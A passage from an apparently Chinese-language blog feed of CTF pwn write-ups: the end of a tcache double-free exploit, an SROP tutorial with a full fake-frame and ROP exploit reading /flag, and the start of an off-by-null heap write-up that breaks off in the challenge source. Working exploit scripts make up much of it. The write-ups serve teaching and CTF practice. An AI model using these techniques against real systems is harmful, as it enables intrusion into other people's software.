class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 